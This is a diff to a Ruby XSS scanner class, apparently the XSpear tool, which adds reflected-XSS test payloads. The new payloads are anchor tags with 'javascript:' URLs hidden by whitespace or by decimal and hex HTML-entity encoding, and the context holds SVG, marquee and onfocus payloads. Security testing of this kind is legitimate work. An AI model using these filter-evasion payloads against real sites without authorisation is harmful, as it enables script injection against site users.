@@ -558,7 +558,13 @@ class XspearScan
       r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
       r.push makeQueryPattern('x', '"\'><meter onmouseover=alert(45)>0</meter>', '<meter onmouseover=alert(45)>0</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
       r.push makeQueryPattern('x', '"\'><svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>', '<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" />', 'h', "reflected "+"SVG Animate XSS".red, CallbackStringMatch)
-
+      r.push makeQueryPattern('x', '"\'><a href="jav    ascript:alert(45)">XSS</a>', '<a href="jav    ascript:alert(45)"">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="javascript&colon;alert(45)">XSS</a>', '<a href="javascript&colon;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="javascript&#0058;alert(45)">XSS</a>', '<a href="javascript&#0058;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="javascript&#0000058alert(45)">XSS</a>', '<a href="javascript&#0000058alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="&#14; javascript:alert(45)">XSS</a>', '<a href="&#14; javascript:alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="javascript&#x003a;alert(45)">XSS</a>', '<a href="javascript&#x003a;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+      r.push makeQueryPattern('x', '"\'><a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">XSS</a>', '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
 
       onfocus_tags.each do |t|
         r.push makeQueryPattern('x', "\"'><#{t} autofocus onfocus=alert(45)>", "<#{t} autofocus onfocus=alert(45)>", 'h', "reflected "+"onfocus XSS Code".red, CallbackStringMatch)
